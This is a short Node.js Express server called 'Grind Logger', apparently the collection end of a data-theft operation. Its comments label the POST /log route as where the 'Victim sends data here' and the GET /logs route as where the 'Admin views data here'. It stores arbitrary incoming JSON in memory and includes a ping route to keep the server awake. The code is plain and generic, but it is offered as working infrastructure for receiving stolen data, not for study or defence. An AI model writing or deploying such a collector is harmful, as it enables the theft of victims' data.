const express = require('express');
const app = express();

// Parse JSON bodies for the /log endpoint
app.use(express.json());

// Simple in-memory storage for logs
let logs = [];

// 1. Root route (Fixes "Cannot GET /")
app.get('/', (req, res) => {
    res.send('OK');
});

// 2. Uptime Robot Ping Route
app.get('/ping', (req, res) => {
    res.send('OK');
});

// 3. Log Receiver (Victim sends data here)
app.post('/log', (req, res) => {
    const entry = {
        id: Date.now(),
        timestamp: new Date().toISOString(),
        data: req.body
    };
    logs.push(entry);
    
    console.log(`[LOG] Received: ${JSON.stringify(req.body)}`);
    
    res.json({ status: 'success', id: entry.id });
});

// 4. Log Viewer (Admin views data here)
app.get('/logs', (req, res) => {
    // Return last 50 logs
    res.json(logs.slice(-50));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Grind Logger running on port ${PORT}`);
});
